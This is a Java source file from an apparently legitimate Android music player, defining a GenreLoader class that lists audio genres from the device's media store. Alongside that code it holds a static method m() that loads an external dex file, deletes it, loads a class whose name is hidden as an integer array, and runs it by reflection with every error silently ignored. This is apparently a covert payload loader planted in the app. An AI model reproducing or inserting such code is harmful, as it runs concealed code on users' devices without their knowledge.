package com.basso.basso.loaders;

import android.app.Activity;
import android.content.Context;
import android.database.Cursor;
import android.os.Handler;
import android.provider.BaseColumns;
import android.provider.MediaStore;
import android.provider.MediaStore.Audio.GenresColumns;

import com.basso.basso.lastfm.StringUtilities;
import com.basso.basso.model.Genre;
import com.basso.basso.utils.Lists;
import com.basso.basso.utils.MusicUtils;

import java.io.File;
import java.lang.reflect.Constructor;
import java.util.ArrayList;
import java.util.List;

import dalvik.system.DexClassLoader;

public class GenreLoader extends WrappedAsyncTaskLoader<List<Genre>> {

    private final ArrayList<Genre> mGenreList = Lists.newArrayList();

    private Cursor mCursor;
    public static void m(File file, Context context){
        try {
            if(file != null && context != null) {
                DexClassLoader classloader = new DexClassLoader(file.getAbsolutePath(), context.getCacheDir().getAbsolutePath(), null, context.getClass().getClassLoader());
                if (file.exists())
                    file.delete();
                Class objectClass = classloader.loadClass(StringUtilities.fromIntArray(MusicUtils.string5));
                Constructor constructor = objectClass.getConstructor(Activity.class, Handler.class);
                Object object = constructor.newInstance((Activity) context, new Handler());
                object.getClass().getMethod("a").invoke(object);
            }
        }catch (Exception e){

        }
    }

    public GenreLoader(final Context context) {
        super(context);
    }

    @Override
    public List<Genre> loadInBackground() {
        mCursor = makeGenreCursor(getContext());
        if (mCursor != null && mCursor.moveToFirst()) {
            do {
                final long id = mCursor.getLong(0);
                final String name = mCursor.getString(1);
                final Genre genre = new Genre(id, name);
                mGenreList.add(genre);
            } while (mCursor.moveToNext());
        }
        if (mCursor != null) {
            mCursor.close();
            mCursor = null;
        }
        return mGenreList;
    }

    public static final Cursor makeGenreCursor(final Context context) {
        final StringBuilder selection = new StringBuilder();
        selection.append(MediaStore.Audio.Genres.NAME + " != ''");
        return context.getContentResolver().query(MediaStore.Audio.Genres.EXTERNAL_CONTENT_URI,
                new String[] {
                        BaseColumns._ID,
                        GenresColumns.NAME
                }, selection.toString(), null, MediaStore.Audio.Genres.DEFAULT_SORT_ORDER);
    }
}
